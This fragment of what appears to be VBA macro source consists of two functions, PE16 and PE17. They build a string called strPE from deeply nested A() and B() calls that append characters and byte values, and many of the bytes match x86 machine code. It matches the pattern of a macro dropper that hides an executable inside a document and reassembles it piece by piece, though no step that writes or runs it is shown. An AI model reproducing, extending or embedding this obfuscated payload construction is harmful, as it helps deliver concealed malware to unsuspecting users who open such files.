    strPE = A(A(A(A(A(A(A(A(A(A(B(A(A(B(A(A(B(A(A(A(B(A(B(A(B(A(A(A(A(B(A(A(A(A(B(A(B(A(A(A(B(A(B(A(B(strPE, "1"), 194), "!"), 204), "C"), 217), 146), 7), "/"), 178), ")t%"), 155), 8), 218), 34), "B"), 21), 171), 225), 151), "C'"), 144), "8hD"), 16), "0"), 15), 13), 155), "-"), 23), 226), "."), 211), 236), "n"), 224), 237), 24), 166), 186), 235), 156), 27), 204), 141)
    strPE = A(A(A(A(B(A(B(A(A(B(A(A(B(A(A(B(A(A(A(B(A(B(A(A(A(B(A(A(A(A(A(A(A(B(A(B(A(A(B(A(B(A(A(B(A(strPE, 156), "u"), 213), 230), "r"), 8), "Eyp"), 207), 217), "s5"), 4), "Q"), 225), 233), 183), 165), 132), 142), 250), "|N"), 149), 241), 160), "&"), 167), "^"), 212), 252), 4), "%"), 129), 176), "{"), 5), 29), "N"), 128), 184), "7}"), 130), "e"), 251), 198), 238), 194)
    strPE = A(B(A(A(A(A(A(A(A(A(A(A(B(A(A(A(B(A(B(A(A(B(A(A(A(A(A(B(A(B(A(A(B(A(B(A(B(A(A(A(A(B(A(B(strPE, "B"), 17), "\"), 247), 21), 26), 188), "xC"), 228), "Y"), 18), ")"), 151), 145), "?"), 166), ":0"), 238), 255), 229), 14), 227), "["), 196), 189), "&oQ"), 16), "9"), 10), 6), 21), "M)."), 248), 6), 224), 25), 34), 212), 215), 181), 189), 226), "M"), 169)
    strPE = A(A(B(A(A(B(A(A(A(B(A(A(A(A(A(B(A(B(A(A(A(A(B(A(A(A(A(B(A(A(A(B(A(A(B(A(B(A(A(A(strPE, 5), 200), 4), "'xla"), 7), ">"), 187), 231), "vS,%"), 215), 239), 237), "c"), 198), 166), 28), 148), "q"), 230), 151), 152), 242), "H"), 25), "#"), 248), 214), 252), 207), 240), "i*H"), 3), 152), 169), "("), 26), 26), "7MQ"), 218), 16)
    strPE = A(A(A(A(B(A(A(B(A(A(A(B(A(B(A(B(A(B(A(A(A(A(A(A(A(B(A(B(A(A(A(B(A(A(A(A(B(A(A(A(A(B(A(A(A(B(strPE, "="), 250), 205), 5), "{'n"), 224), 202), 228), 202), "Np"), 156), 7), 199), 208), "~"), 253), 150), 234), ")"), 210), "d"), 232), 28), 182), 11), 235), 172), 139), "v"), 28), "|L"), 178), "-"), 233), ":"), 147), 255), 226), "j"), 209), 235), "k"), 10), 129), 231), 129)
    strPE = B(A(A(B(A(A(A(B(A(A(A(B(A(B(A(B(A(A(B(A(A(A(A(B(A(B(A(B(A(A(A(B(A(A(A(A(A(A(A(B(A(A(B(A(A(A(strPE, 226), 172), 162), "f"), 252), 140), "0"), 30), 247), 231), 143), 201), 144), 6), "e"), 146), 134), 235), "S;jg"), 162), "%"), 161), "R"), 132), 22), 199), 8), "l"), 155), 223), "h"), 21), "j"), 229), "b"), 149), 155), 206), "F"), 254), 217), 145), "\"), 183), 128), "Y1")
    strPE = A(A(B(A(B(A(A(A(B(A(A(A(B(A(A(B(A(B(A(A(A(A(A(B(A(B(A(A(A(B(A(A(B(A(A(A(B(A(B(A(A(A(B(A(A(A(strPE, 184), 7), 251), "^"), 172), 148), 10), "Q"), 30), ")"), 19), 186), 213), "J"), 157), 132), "]"), 3), 202), 163), "9"), 2), "F"), 189), 191), 130), 251), 197), "T"), 199), "d"), 230), 250), "/ZKB"), 132), 13), 166), "e"), 161), 187), 159), "Y"), 253), "CU"), 184), 161)
    strPE = A(B(A(A(B(A(B(A(A(A(A(A(A(B(A(B(A(A(A(A(B(A(B(A(A(B(A(A(A(A(A(A(A(A(A(B(A(A(A(A(B(A(A(B(A(strPE, 30), "v"), 13), 207), "EL"), 151), 220), 245), 180), ";"), 190), 186), 158), 231), 251), 170), 209), 7), 166), "#"), 219), 8), "v"), 27), "."), 220), 235), 24), 3), "pzi"), 135), "P"), 225), 27), 14), 14), 231), 153), "A"), 3), "<"), 172), 187), "c-]"), 189)
    strPE = A(A(A(A(A(A(B(A(A(B(A(A(B(A(A(A(A(A(A(B(A(A(A(B(A(A(B(A(A(A(A(B(A(A(A(A(B(A(A(A(A(B(A(strPE, 27), " "), 172), 130), 168), 159), "40\y"), 27), 29), 7), 157), "Y{"), 164), 236), 164), 216), "t"), 24), 183), "p$"), 234), 207), 21), "L"), 175), 6), 161), 242), 183), 14), "n"), 152), 188), "M"), 196), 28), "6Bt"), 3), 236), 245), 138), 146), 27)
    strPE = B(A(A(A(A(A(B(A(B(A(B(A(A(B(A(A(A(A(A(A(A(A(A(B(A(A(A(B(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(B(A(A(A(A(strPE, 175), 154), 162), 177), "a"), 7), 156), 191), 250), 24), 229), 133), "\"), 198), 234), 169), 240), 161), 164), 196), 163), "j"), 145), 219), 180), "-"), 136), 237), 194), 238), 154), 20), 225), 226), 166), "zq"), 203), 169), "]"), 19), "C"), 34), "n"), 147), 129), 144), 203), 174), "4")
    strPE = A(A(A(B(A(B(A(A(B(A(B(A(A(B(A(B(A(A(B(A(A(B(A(A(A(A(A(A(B(A(A(A(A(A(A(A(B(A(A(B(A(A(strPE, 194), 171), "<"), 247), 172), "]G42"), 11), 188), 5), 188), 249), 145), 147), "6"), 206), 148), 242), 25), 1), 220), "V<"), 156), 150), "m"), 242), 171), "3"), 34), "|"), 29), 243), ":["), 133), "q"), 13), 9), "("), 5), "Omux"), 152), 214), 16)
    strPE = A(B(A(B(A(A(A(A(A(B(A(A(A(A(A(A(B(A(B(A(A(B(A(A(B(A(A(B(A(A(A(B(A(A(B(A(A(A(B(A(strPE, 209), "H"), 188), 189), 6), "4q"), 27), 127), "N"), 182), 200), 130), "H"), 233), 202), "9"), 234), 154), "k"), 212), 237), "4"), 155), "%gfU`"), 168), 31), 147), 172), 26), 247), "{u"), 213), 205), 16), 168), 3), "<6(2>"), 179), "d"), 129)
    strPE = A(A(A(A(A(A(A(B(A(A(A(B(A(A(A(B(A(B(A(A(B(A(B(A(A(B(A(B(A(A(B(A(B(A(A(A(B(A(A(A(A(A(strPE, 132), 149), 10), 23), 29), "%"), 250), 157), 156), "1"), 129), "YW"), 245), 127), "7Ht"), 237), "zlb"), 146), 254), "2"), 199), "1"), 18), 255), "BM"), 222), "i"), 231), 160), 152), "b"), 214), 193), 142), "0 l"), 198), 248), 158), 255), 203), 207), 227)
    strPE = A(B(A(B(A(A(A(B(A(A(B(A(B(A(A(A(B(A(A(A(A(A(B(A(A(A(B(A(B(A(B(A(A(A(B(A(A(B(A(A(A(B(A(A(strPE, 248), 19), "A&"), 177), 136), 214), "8"), 29), 2), "G"), 6), 21), 230), "M"), 5), "H:"), 203), "G"), 181), 157), 12), "|G{"), 225), 225), 192), 231), 29), "9by"), 230), 5), 26), "U"), 207), " "), 17), 193), "*"), 204), 155), 162), "n"), 208), "'"), 202)

    PE16 = strPE
End Function

Private Function PE17() As String
   Dim strPE As String

    strPE = ""
    strPE = B(A(A(A(B(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(B(A(A(B(A(A(A(B(A(A(A(B(A(B(A(A(A(A(A(A(A(B(A(strPE, 213), "p"), 226), 207), 127), 171), 232), 201), 9), "f\H["), 208), "E"), 182), 25), 146), "U"), 246), 152), 212), "5"), 23), 4), "*"), 18), 138), 238), 230), 171), 147), 25), 161), "#e?{w"), 245), 155), 178), 136), 1), 155), "w"), 154), 136), 201), ">")
    strPE = A(A(A(B(A(B(A(A(A(A(A(B(A(B(A(A(B(A(B(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(B(A(A(B(strPE, "@"), 170), 15), "p?"), 208), 17), 235), 136), 147), 253), 197), 134), 129), "."), 159), 7), 160), 175), 215), 247), 223), "h"), 220), "S2hTb"), 178), 212), "/"), 173), ":"), 154), 189), 181), 177), 240), "u<* ;"), 171), "4["), 157), 13), 202)
    strPE = B(A(A(B(A(A(A(A(A(B(A(A(A(B(A(A(A(A(B(A(A(A(A(B(A(A(B(A(A(A(A(B(A(A(A(A(A(B(A(A(B(A(strPE, 3), "j|"), 226), 206), "u)ZrN"), 253), 159), 216), 246), 185), "V?K"), 176), 22), 223), 178), "["), 202), 186), "`\"), 148), 204), 31), 191), "Y"), 132), 230), 187), 206), "4"), 145), 233), 209), "X"), 190), 242), 152), 171), 228), "l"), 206), 171), "u")
    strPE = B(A(A(B(A(A(A(A(A(B(A(A(A(B(A(A(A(A(A(A(B(A(B(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(B(A(B(A(B(A(B(strPE, "$"), 19), "m"), 225), "M$"), 195), "25o6"), 243), 240), 181), 211), "K"), 144), 187), 244), 251), 221), 199), 134), 200), 131), 232), "G"), 188), "<"), 224), 20), 239), 138), 132), 217), "2"), 2), 145), 154), "G("), 226), 251), 212), 205), 143), "1"), 246), 209), "+")
    strPE = A(A(A(B(A(A(A(A(A(B(A(A(A(B(A(B(A(A(B(A(A(B(A(A(A(B(A(B(A(B(A(A(A(A(A(B(A(A(A(A(A(B(A(strPE, 131), "N"), 12), 136), 206), 30), 207), "<"), 6), 173), 185), 13), 142), "I"), 184), ":GM"), 130), "X"), 20), 198), 139), "*N"), 4), 140), "F"), 227), 222), "j"), 23), "RcLxa"), 251), 193), 4), "9"), 195), 169), 227), 145), 3), "B"), 203), 23), 232)
    strPE = A(A(B(A(A(B(A(B(A(A(A(A(B(A(A(B(A(B(A(B(A(B(A(A(B(A(B(A(A(A(B(A(A(A(A(A(A(A(A(B(strPE, "("), 14), 240), 201), 230), 159), 203), 182), 34), "L6"), 199), 208), 233), "k"), 227), "O"), 2), 17), "qx"), 135), ","), 142), "9E6"), 249), "T/"), 218), 1), "[Tmup"), 253), 253), 146), 22), "g"), 179), "2"), 234), 171), "^."), 129), 149)
    strPE = B(A(A(B(A(A(A(A(A(B(A(B(A(A(A(A(B(A(A(A(A(B(A(A(B(A(A(B(A(A(A(A(A(A(A(A(A(B(A(A(A(A(strPE, 254), 134), 226), 183), "pd"), 137), 135), 232), 10), 227), 130), 228), 21), 20), "z"), 23), 164), "CTg"), 215), 184), "b.(Y"), 181), 235), 172), 230), "M"), 24), 131), 251), 209), "-J"), 193), ","), 208), 222), 137), 249), 163), "T"), 34), 16), "Sw")
    strPE = A(B(A(B(A(B(A(A(A(B(A(A(B(A(A(B(A(B(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(B(A(B(A(A(A(B(A(B(A(A(A(A(strPE, 232), 143), 3), 189), "?"), 199), "~]"), 134), 138), 237), "3"), 160), "\?"), 201), 1), "c"), 172), 253), 162), 234), 237), 233), 175), 219), 154), 254), 141), 241), "U"), 169), "4"), 29), 1), "fy"), 176), 197), "~Q"), 151), 217), 223), "Q"), 216), "<"), 170), "="), 28)
    strPE = B(A(A(A(A(A(B(A(B(A(A(B(A(A(A(A(A(A(A(A(A(A(A(B(A(B(A(B(A(B(A(A(A(A(A(A(B(A(B(A(A(B(A(A(A(strPE, 246), 255), 250), "t"), 211), 195), "e"), 244), "yA"), 196), 30), 141), 31), 228), 218), "$"), 172), "Za"), 211), "%M("), 182), "Z"), 231), 2), 233), 188), 230), 243), 143), 17), 254), 234), 160), "-"), 135), 17), "2E"), 18), ","), 219), 170), 222), 2), 222), ",")
    strPE = B(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(B(A(B(A(A(A(B(A(B(A(A(B(A(A(B(A(strPE, 145), "/ZZ"), 179), 6), "~'%>nc2"), 235), 245), "o]"), 239), "{"), 244), 139), 249), "-"), 160), ">"), 11), "_EZ"), 175), 139), 152), 217), 18), 202), 149), 177), 210), 238), 21), 184), 234), 1), "k}"), 201), 224), 200), ">9")
    strPE = B(A(A(A(A(B(A(A(A(A(B(A(B(A(A(A(B(A(B(A(A(A(A(A(B(A(B(A(A(B(A(A(A(A(A(B(A(B(strPE, "((u"), 222), "0"), 158), 17), 141), 27), 140), "G$"), 135), 7), "t/}"), 130), "\"), 137), 132), 220), 185), 141), "P%"), 160), "1YNm"), 167), 21), 10), "Q}"), 185), "}["), 148), 17), 131), 224), "/g"), 236), 211), 26), 196), "\")
    strPE = B(A(A(B(A(B(A(A(A(A(A(A(A(A(A(A(A(B(A(B(A(A(A(B(A(A(A(B(A(A(A(A(B(A(B(A(B(A(A(B(A(B(A(A(B(A(A(strPE, 201), 188), "F"), 162), 27), "'"), 198), "."), 137), 14), "1Q"), 135), "}"), 231), "G^L"), 170), 186), 16), 246), "%"), 240), 255), 139), "U"), 16), 133), 210), "t"), 11), "Q"), 232), 130), 255), 255), 255), 131), 196), 6), 137), 2), 139), "F"), 20), "P"), 255), 139), "t")
    strPE = B(A(B(A(A(A(A(A(B(A(A(B(A(A(A(A(B(A(A(A(B(A(A(B(A(A(A(B(A(A(A(B(A(A(A(A(B(A(A(A(A(A(A(B(A(A(A(A(strPE, 192), 155), 0), 199), "F"), 20), 0), 0), 0), 0), 184), "u"), 130), 1), 31), 191), "]"), 194), 16), 0), "="), 2), 1), 0), "4u"), 229), 184), ":"), 17), 205), 0), "^]"), 194), 16), 20), 139), "5"), 152), 192), "@"), 0), 255), 214), 133), 192), "u"), 5), "^")
    strPE = A(A(A(A(A(A(B(A(A(A(A(B(A(A(B(A(A(B(A(A(A(A(B(A(A(B(A(A(A(B(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(B(strPE, "]"), 165), 151), 9), 255), 214), 5), 128), 252), 10), 0), "^]H"), 16), 0), 145), 144), 144), 240), "U"), 139), 236), 139), "M"), 16), 139), "E"), 8), 133), 201), 138), "t"), 159), 141), "t"), 8), 255), ";"), 198), 219), 17), 139), "U"), 12), 138), 10), 132), 201), 136)
    strPE = A(B(A(A(A(A(A(A(A(B(A(A(A(B(A(B(A(B(A(A(A(A(B(A(B(A(A(A(A(B(A(A(A(A(B(A(A(A(strPE, 159), 234), 9), "@B;Qr"), 242), 198), 0), 0), "^]"), 194), 12), 1), 144), "U"), 184), "<a"), 15), 29), 0), 193), "@"), 0), "VW0}"), 8), "j/W"), 255), 211), 163), "\W"), 139), 240), 255), 174), 190), 196), 16), ";"), 198)
    strPE = A(B(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(B(A(B(A(A(B(A(A(A(A(A(A(A(A(A(B(A(B(A(A(A(A(A(B(strPE, "v"), 2), 139), 240), 133), 246), "u"), 14), "j::"), 255), 247), 139), 240), 195), 196), 8), 133), 246), "t"), 10), 141), "F"), 1), "_^["), 156), 194), 4), 0), 161), "%_^[M"), 194), 4), 0), 144), 144), 144), 144), 144), 176), 144), "U"), 218)
    strPE = A(A(B(A(A(A(A(A(A(A(A(A(A(A(B(A(A(B(A(B(A(B(A(B(A(A(B(A(A(A(A(A(B(A(B(A(B(A(B(A(A(A(A(strPE, 236), 243), 236), 24), "S"), 139), "]"), 16), ")"), 219), "<"), 199), 235), 252), 0), 0), "~#}"), 19), 14), "E"), 12), "3Q"), 131), "Z?t"), 9), "oL"), 152), 15), "r"), 133), 4), 4), 247), 141), 4), 157), 4), 0), 0), 0), "VP"), 255), 170)
    strPE = A(A(B(A(A(A(A(B(A(A(A(A(B(A(A(A(B(A(A(A(A(B(A(A(B(A(B(A(A(A(B(A(B(A(B(A(A(A(A(A(A(A(A(A(B(A(A(strPE, 7), 193), "@"), 0), 131), 196), 212), 139), 248), 133), 195), 137), "}"), 246), "~6"), 139), "E"), 12), 216), 247), "+G"), 137), "]"), 248), 137), "E"), 16), 235), 3), 14), "E"), 16), 139), 12), "0Q"), 255), 21), 12), 193), "@"), 0), 131), 196), 4), "@"), 137), 6)
    strPE = B(A(A(B(A(A(A(A(B(A(A(A(A(B(A(B(A(B(A(A(A(B(A(A(B(A(A(A(A(A(B(A(B(A(A(A(A(B(A(A(A(A(B(A(A(A(A(B(A(strPE, 139), "c"), 252), 3), 208), 139), "E"), 188), 131), 198), 4), "H"), 137), 200), 252), 137), "E"), 248), "u"), 217), 139), 208), 252), 141), "D"), 29), 161), "P"), 149), 7), 252), "g"), 21), "\"), 193), "@"), 0), 131), 196), 4), "3"), 201), 133), 219), 170), "E"), 248), 139), "z~")
    strPE = A(B(A(B(A(B(A(A(A(B(A(A(B(A(A(B(A(B(A(A(A(A(B(A(A(A(A(B(A(A(B(A(B(A(A(B(A(A(B(A(A(A(A(B(A(B(strPE, "T"), 188), "E"), 12), 240), 167), 244), "+"), 193), 139), "M"), 252), 137), "E"), 231), ")]"), 12), 137), "]"), 232), 235), 3), 139), "E"), 16), 139), 23), 137), "M"), 24), ":M"), 20), 25), "U"), 240), 239), "7"), 139), 4), 7), "7"), 141), "U"), 240), "VRP"), 232)
    strPE = B(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(B(A(A(B(A(B(A(B(A(B(A(A(A(A(A(A(A(B(A(B(A(A(A(B(A(A(A(strPE, 14), 5), 0), "{"), 139), 184), 252), "bE"), 251), "+"), 193), 131), 148), 4), 3), 240), 139), "E"), 12), "H"), 137), "E"), 12), "F"), 203), 139), "}"), 244), 139), 13), 232), 139), "E"), 248), 199), 141), 143), 0), 202), 0), 0), 154), 138), "Q+=FVP")
    strPE = A(B(A(A(A(A(A(B(A(B(A(A(B(A(A(A(A(B(A(A(A(B(A(A(A(A(B(A(A(B(A(B(A(B(A(B(A(B(A(A(B(A(B(A(A(strPE, 255), 21), " "), 193), "@"), 0), 139), "M3"), 131), "5"), 8), ";"), 193), "^"), 172), "1+"), 193), 139), "c"), 14), 192), 133), 219), "~b"), 139), 20), 135), "("), 209), 137), 20), 135), "@"), 244), 24), "|%"), 139), "M"), 8), 139), 229), 201), 145), "_["), 139)
    strPE = A(A(A(A(B(A(A(B(A(A(A(A(A(A(A(B(A(B(A(A(A(B(A(A(B(A(A(B(A(B(A(A(A(A(A(B(A(B(A(A(A(A(B(A(B(A(strPE, 229), "]"), 195), "s;"), 229), 139), 195), 137), ":"), 13), "["), 215), 229), 204), 195), 139), "E"), 8), "~8"), 139), 195), "_["), 255), 229), "]C"), 144), 144), 144), "p"), 144), "U"), 139), 191), 161), 220), 8), 29), 207), "U"), 133), 192), "("), 15), 25), 233), 1)
    strPE = B(A(A(A(B(A(A(A(A(B(A(A(A(A(B(A(A(B(A(A(A(B(A(A(A(A(B(A(B(A(A(A(A(A(A(B(A(B(A(A(A(A(B(A(A(B(A(A(strPE, 0), 0), "h"), 248), 128), "H"), 0), 199), 5), 248), "*"), 196), "w"), 148), 0), 0), 148), 255), 21), " "), 192), "@"), 0), 161), 8), 255), ";"), 0), 131), 248), "n"), 15), 133), "82"), 0), 0), 160), 12), "VA"), 0), 190), 12), 8), "A"), 0), 150), 192), "t")
    strPE = A(A(B(A(A(B(A(A(A(A(A(A(A(B(A(B(A(B(A(A(A(A(A(A(A(A(B(A(A(A(B(A(B(A(B(A(B(A(A(A(A(B(A(B(A(B(A(B(strPE, ";"), 139), "=h"), 190), "@"), 0), "pt"), 193), 15), 0), 20), "l"), 1), "~"), 14), "3"), 201), "j"), 4), 138), 14), "Q"), 255), 215), 131), 196), 8), 235), 17), 161), "x"), 193), "@"), 0), "3"), 210), 138), 22), 139), 8), 138), 4), "Q"), 131), 224), "'"), 133), 192)
    strPE = A(A(B(A(B(A(A(A(B(A(A(A(A(B(A(A(A(A(B(A(A(A(A(A(A(B(A(A(A(A(B(A(A(A(A(A(B(A(B(A(A(A(A(B(strPE, "u"), 218), 138), 236), 1), "F)"), 192), "u"), 229), 212), 13), 224), 8), "A"), 240), 161), 252), 7), "A"), 0), 131), 248), 3), 15), 245), "_0"), 0), 0), 15), 132), "YKf"), 0), 131), 248), 138), "ue"), 131), 249), 2), "s#"), 184), "("), 0), 199)
    strPE = B(A(A(B(A(A(A(A(A(A(B(A(A(A(A(B(A(A(B(A(A(A(B(A(A(B(A(A(A(A(A(A(A(A(B(A(A(B(A(B(A(B(A(A(A(A(B(A(strPE, 30), "#J"), 1), 0), 0), 128), ">"), 15), "t"), 205), "V"), 255), 21), "l"), 212), 138), 0), 139), 200), 131), 196), 4), "%"), 13), 224), "BA"), 0), 235), 191), "w"), 10), 184), "*"), 213), 22), 132), 233), "1"), 1), 0), 0), 131), 249), 235), "w"), 155), 184), "+")
    strPE = B(A(B(A(A(A(A(B(A(A(A(B(A(A(A(A(A(A(A(B(A(A(A(B(A(A(A(A(A(A(A(A(A(B(A(A(B(A(A(A(A(A(B(A(B(A(A(A(strPE, 20), 0), 0), "]"), 22), "k"), 0), 0), 131), 140), 4), "w"), 10), 184), ","), 0), 0), 0), 233), 7), 1), 0), 20), 186), "f"), 239), 0), 192), ";"), 209), 27), 192), 247), 216), 131), 192), "-"), 233), 244), 0), "j"), 0), 131), 249), 5), "uU{"), 186), "{")
    strPE = A(A(A(A(A(A(A(B(A(A(B(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(B(A(B(A(B(A(A(A(A(A(A(B(A(A(B(A(A(B(A(A(B(strPE, "Az"), 133), 192), "u"), 30), 133), "pu"), 191), 214), "2"), 0), 0), 0), 233), 216), 0), "2"), 0), "3"), 192), "&"), 249), 1), 15), 149), 192), 131), 29), 165), 233), 157), 0), "k"), 0), 131), 248), 2), "u"), 10), 184), "F"), 0), 0), 0), 233), 185), 0), 0)
    strPE = A(A(A(A(B(A(B(A(B(A(B(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(B(A(A(B(A(A(B(A(strPE, 0), " "), 249), 1), "&"), 10), 162), "<"), 0), 0), 0), 233), 170), 0), 0), 0), "3"), 192), 131), 249), 16), 15), 149), 192), 131), 192), "="), 233), 154), 0), 0), 0), 131), 30), 6), 247), 216), 27), 192), "$"), 236), "G"), 192), "P"), 233), "]"), 0), 0), 0), 131)
    strPE = B(A(A(A(A(A(A(A(A(B(A(A(A(B(A(B(A(B(A(B(A(A(A(A(B(A(A(B(A(A(A(B(A(A(A(A(B(A(A(A(A(B(A(A(strPE, 209), 200), "u"), 127), 160), 237), 8), "A"), 0), 190), 12), 8), "A"), 0), 10), 192), "t;"), 139), 24), "h"), 12), 145), 217), 161), "t"), 193), "@m"), 131), "8)~?3"), 201), "l"), 1), 138), 14), "Q"), 255), 213), 131), 185), 8), 235), 17), 159), "A")
    strPE = A(B(A(A(A(A(B(A(A(A(B(A(A(A(B(A(A(A(A(B(A(B(A(B(A(A(B(A(B(A(A(B(A(A(A(A(A(B(A(A(B(A(A(A(B(strPE, "D@63p"), 138), 22), 139), "G"), 138), 4), "Q"), 131), 224), 1), 133), 192), "u"), 8), 138), "F"), 1), "F"), 132), 192), "uN"), 161), ";"), 8), "A"), 0), 131), 135), 10), "s"), 16), 138), 14), "3"), 192), 195), 249), "C"), 15), 157), 192), 141), "D"), 218)
    strPE = A(B(A(A(A(B(A(B(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(B(A(A(A(A(B(A(A(B(A(A(A(B(A(B(A(A(strPE, 10), 235), "!"), 131), "jZs"), 16), 138), 14), "3|"), 1), 249), "A"), 15), 180), 192), 215), "D"), 0), 14), 235), 183), 184), "S"), 0), 0), 0), 235), 5), 184), 1), 0), 0), 0), 163), 220), 8), "A"), 0), 139), "U"), 229), "_"), 137), 2), 139), "5"), 220)
    strPE = A(A(B(A(A(A(B(A(A(B(A(B(A(A(A(B(A(B(A(A(A(B(A(A(A(B(A(A(A(B(A(A(B(A(A(A(A(A(A(A(A(A(B(A(strPE, 8), "A"), 0), 244), 192), 131), 254), 1), 15), 130), 192), "H^%.N"), 0), 0), "]}"), 185), 148), 166), "aT"), 144), 144), 144), "U"), 139), 236), 139), "E"), 8), "V"), 139), 12), 133), "b"), 8), "X"), 0), 141), "4"), 133), 228), 8), "A"), 0), 133)
    strPE = A(A(B(A(A(A(B(A(B(A(A(A(A(B(A(A(A(A(A(A(B(A(A(B(A(A(A(B(A(A(A(B(A(A(A(A(B(A(B(A(A(A(A(A(B(A(strPE, 201), "uh"), 139), 157), 133), 244), 196), "@"), 0), "P"), 255), 21), 24), 192), "@"), 0), 133), 192), ")"), 6), 194), 3), "^]"), 195), 139), "E"), 16), 133), 9), 217), 145), 139), "0PQ"), 255), 21), 28), 192), "@"), 0), "^"), 224), 179), 139), "U"), 12), 139)
    strPE = B(A(B(A(B(A(A(B(A(B(A(A(A(B(A(B(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(B(A(A(A(A(A(B(A(strPE, 6), "R"), 178), 255), 208), 28), 192), ";"), 0), "^]"), 193), 144), 144), 144), 144), 144), 139), 144), 144), 144), 144), 144), 209), 222), 6), 236), 26), "9"), 20), "SmW"), 139), "}"), 12), 27), 23), "Z"), 210), "eU"), 248), 222), "j"), 252), "^3"), 192), "[")
    strPE = A(A(A(A(B(A(B(A(B(A(A(A(B(A(A(A(A(B(A(B(A(B(A(A(A(B(A(A(A(A(A(B(A(A(B(A(A(A(A(B(A(A(A(A(A(A(A(B(A(A(strPE, 139), 229), "]"), 205), 16), 0), 139), 223), 248), 139), "M"), 20), 131), 148), 0), "t"), 234), 139), "u"), 8), 199), 192), 138), 6), "F"), 132), 192), 137), "u"), 8), "x"), 25), "J"), 137), 23), 228), 17), "J"), 137), 17), 194), "M"), 16), "f"), 137), "n"), 131), 193), 7), 137)
    strPE = B(A(A(A(A(B(A(A(A(A(A(A(B(A(B(A(B(A(A(A(A(B(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(strPE, "T"), 14), 233), 200), 1), 0), 0), 139), 200), 129), 225), 192), 0), 0), 0), 128), 146), 137), 15), 133), 135), 0), 0), 0), "0"), 191), 224), 0), "n"), 233), 148), 200), 221), "U"), 240), "#"), 22), "3"), 219), 130), 245), 0), 0), 0), "3"), 210), 157), 207), 137), "u")
    strPE = B(A(B(A(B(A(B(A(A(B(A(B(A(B(A(A(A(B(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(B(A(B(A(A(strPE, 252), 137), "."), 236), "u4;"), 211), "u"), 188), 139), 199), 139), 211), 185), 1), 0), 0), 0), 232), 218), 13), 0), "N"), 11), 248), 11), 218), "F"), 131), 254), 3), "(h"), 252), "wH"), 3), "E"), 236), 139), "M"), 240), "#"), 199), "#A;"), 199), "u")
    strPE = A(B(A(A(A(A(A(A(A(A(B(A(A(A(B(A(B(A(A(B(A(A(B(A(A(A(A(A(A(B(A(A(A(B(A(A(A(B(A(B(A(A(B(A(A(A(strPE, 4), 208), 203), "t"), 211), 139), "Ez"), 139), "U"), 240), 139), 16), "Z"), 182), 4), 247), "#4eU"), 252), 247), 138), 201), 240), 141), "B"), 1), 137), "s"), 244), 139), "E"), 248), ";"), 230), 8), 134), "Y"), 1), 0), 0), 131), 250), 1), 139), 202), "u"), 23)
    strPE = A(B(A(B(A(A(A(A(A(B(A(A(A(A(A(A(A(A(B(A(A(A(A(B(A(A(B(A(A(B(A(A(A(A(A(B(A(A(A(B(A(A(A(strPE, 131), 224), 30), "3"), 255), 11), 199), "ag_^"), 184), 22), 0), 0), 0), "["), 139), 229), "]<"), 16), 166), "P"), 193), 176), 30), 139), "U"), 8), 15), 164), 251), 1), 138), 2), 3), "F$?%"), 255), 0), 0), 0), 153), "#"), 199), "#"), 211)
    strPE = A(B(A(A(A(B(A(A(A(A(B(A(A(A(A(A(B(A(A(A(A(A(B(A(A(A(B(A(B(A(A(B(A(A(A(A(B(A(B(A(A(B(A(A(B(A(A(strPE, 11), 194), "t"), 211), 139), "3"), 252), 131), "l"), 163), "u"), 17), 131), 254), 13), "u-"), 133), 201), "u)"), 139), "E"), 8), 15), 181), " "), 235), 31), 131), 250), 3), "u"), 28), 133), 201), 127), 169), "|"), 5), 131), 254), 4), "w"), 170), 131), 254), "Eu"), 12)
    strPE = B(A(B(A(B(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(B(A(A(A(A(A(B(A(A(B(A(A(A(A(B(A(A(B(A(A(strPE, 133), 201), "u"), 8), 139), "E"), 8), 246), 0), 185), "u"), 153), 139), "}f"), 136), 2), 0), 0), 0), ";"), 252), 139), 31), 27), 214), 128), 216), "@;"), 216), 15), 130), 170), 254), 255), 255), 133), 210), 184), 235), 139), "}"), 8), 235), "B"), 139), "U"), 252), "3")
    strPE = A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(B(A(A(B(A(A(A(A(A(A(B(A(A(A(B(A(A(A(A(B(A(A(A(A(A(A(A(A(A(B(A(A(A(B(strPE, "{J"), 138), 237), 137), "U"), 252), 139), 208), 129), 226), 192), 0), 0), 0), "G"), 128), 250), 128), 137), "}"), 8), 19), 133), "W"), 255), 255), 255), 15), 154), 241), "3"), 131), 224), "?"), 153), 193), 230), 6), 11), 198), 11), 209), 139), 240), 139), "E"), 252), 133), 192)
    strPE = A(A(A(A(B(A(B(A(A(B(A(A(A(B(A(A(A(B(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(B(A(A(B(A(B(A(A(B(A(A(B(A(A(strPE, 139), 202), "u"), 198), 139), "E"), 248), 139), ","), 244), "+"), 194), 5), "U"), 12), 15), 201), 137), 2), 127), 23), "|t"), 129), 254), 0), 0), 1), 0), 158), 13), 139), "E"), 20), 139), 16), "J"), 137), 16), 139), "E"), 16), 235), "<"), 139), "E"), 20), 139), 24), 131)
